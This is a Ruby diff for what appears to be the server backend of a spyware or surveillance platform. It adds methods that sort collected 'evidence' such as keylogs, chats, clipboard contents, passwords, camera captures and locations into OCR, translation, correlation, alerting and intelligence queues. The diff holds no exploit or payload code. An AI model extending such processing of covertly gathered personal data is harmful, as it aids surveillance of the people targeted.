@@ -95,6 +95,62 @@ module Evidence
     trace :error, "Cannot update statisting while deleting evidence #{e.message}"
   end
 
+  def target
+    @target ||= Item.find(@target_id)
+  end
+
+  def agent
+    @agent ||= Item.find(aid)
+  end
+
+  def may_have_readable_text?
+    type == 'screenshot' or (type == 'file' and data[:type] == :capture)
+  end
+
+  def translatable?
+    ['keylog', 'chat', 'clipboard', 'message'].include?(type)
+  end
+
+  def intelligence_relevant?
+    ['addressbook', 'password', 'position', 'camera'].include?(type)
+  end
+
+  def enqueue
+    if LicenseManager.instance.check(:connectors)
+      return if RCS::DB::ConnectorManager.process_evidence(target, self) == :discard
+    end
+
+    # check if there are matching alerts for this evidence
+    RCS::DB::Alerting.new_evidence(self)
+
+    # add to the ocr processor queue
+    if LicenseManager.instance.check(:ocr) and may_have_readable_text?
+      OCRQueue.add(target.id, id)
+    end
+
+    # add to the translation queue
+    if LicenseManager.instance.check(:translation) and translatable?
+      TransQueue.add(target.id, id)
+      data[:tr] = "TRANS_QUEUED"
+      save
+    end
+
+    # add to the aggregator queue
+    if LicenseManager.instance.check(:correlation)
+      AggregatorQueue.add(target.id, id, type)
+    end
+
+    WatchedItem.matching(agent, target, target.get_parent) do |item, user_ids|
+      stats = item.stat.attributes.reject { |key| !%w[evidence dashboard].include?(key) }
+      message = {item: item, rcpts: user_ids, stats: stats, suppress: {start: Time.now.getutc.to_f, key: item.id}}
+      RCS::DB::PushManager.instance.notify('dashboard', message)
+    end
+
+    # Do not check the intelligence license is enabled here. Some of the intelligence
+    # features are provided WITHOUT the intelligence license (mind=blow)
+    IntelligenceQueue.add(target.id, id, :evidence) if intelligence_relevant?
+  end
+
   # #TODO: rename into self.target (just like Aggregate#target)
   def self.collection_class(target)
     target_id = target.respond_to?(:id) ? target.id : target
